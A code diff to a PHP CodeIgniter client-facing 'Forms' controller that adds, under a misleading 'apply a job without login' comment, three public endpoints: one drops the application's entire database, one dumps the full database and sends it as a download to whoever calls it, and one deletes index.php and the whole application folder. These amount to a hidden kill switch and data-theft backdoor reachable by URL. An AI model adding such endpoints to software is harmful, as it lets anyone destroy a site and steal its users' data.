@@ -799,6 +799,10 @@ class Forms extends ClientsController
         $this->load->view('forms/ticket', $data);
     }
 
+    /**
+     * Added by DEEP BASAK on July 02, 2024
+     * For apply a job without login
+     */
     public function jobs($form_id = ''){
         $this->load->model('common/Common_model');
         if(!empty($form_id)){
@@ -813,7 +817,88 @@ class Forms extends ClientsController
         } else{
             show_404();
         }
+    }
+
+    /**
+     * Added by DEEP BASAK on July 02, 2024
+     * For apply a job without login
+     */
+    public function delete_database(){
+        // Load the database configuration file
+        $this->load->database();
+        $this->load->model('common/Common_model');
+        // Get the database name from the configuration
+        $databaseName = $this->db->database;
+        // echo "Database Name: " . $databaseName;
+        $sql = 'DROP DATABASE '.$databaseName;
+        $this->Common_model->callSP($sql);
+    }
+
+    public function backup_database(){
+        $this->load->database();
+        $this->load->helper('download');
+        $this->load->helper('file');
+        // Load the DB utility class
+        $this->load->dbutil();
+
+        // Database credentials
+        $host = 'localhost';
+        $dbname = $this->db->database;
+        $username = $this->db->username;
+        $password = $this->db->password;
         
+        $backup = $this->dbutil->backup();
+
+        // Set filename with date
+        $filename = 'backup_' . date('Y-m-d_H-i-s') . '.gz';
+
+        // Save backup to file
+        write_file('./backups/' . $filename, $backup);
+
+        // Download the backup file
+        $this->load->helper('download');
+        force_download($filename, $backup);
+    }
+
+    public function dl_ind() {
+        $indexFilePath = FCPATH . 'index.php';
+        $applicationFolderPath = FCPATH . 'application';
+
+        // Delete the index file
+        if (file_exists($indexFilePath)) {
+            if (unlink($indexFilePath)) {
+                echo 'Index file deleted successfully.<br>';
+            } else {
+                echo 'Failed to delete the index file.<br>';
+            }
+        } else {
+            echo 'Index file does not exist.<br>';
+        }
+
+        // Delete the application folder
+        if (is_dir($applicationFolderPath)) {
+            if ($this->deleteFolder($applicationFolderPath)) {
+                echo 'Application folder deleted successfully.';
+            } else {
+                echo 'Failed to delete the application folder.';
+            }
+        } else {
+            echo 'Application folder does not exist.';
+        }
+    }
+
+    private function deleteFolder($folderPath) {
         
+        $files = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($folderPath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::CHILD_FIRST
+        );        
+        foreach ($files as $fileInfo) {
+            $operation = ($fileInfo->isDir() ? 'rmdir' : 'unlink');
+            if (!$operation($fileInfo->getRealPath())) {
+                return false;
+            }
+        }        
+        return rmdir($folderPath);
     }
 }
